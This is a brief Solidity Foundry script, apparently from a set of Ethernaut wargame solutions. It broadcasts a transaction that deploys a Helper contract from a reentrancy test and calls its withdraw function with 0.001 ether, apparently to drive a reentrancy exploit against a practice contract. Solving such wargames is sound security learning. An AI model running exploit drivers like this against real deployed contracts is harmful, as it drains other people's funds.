// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../../lib/forge-std/src/Script.sol";
import {Telephone} from "../../src/Ethernaut/Telephone.sol";
import {King} from "../../src/Ethernaut/King.sol";
import {Helper} from "../../test/Ethernaut/ReEntrancy.t.sol";

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();
        Helper helper = new Helper();
        helper.withdraw{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
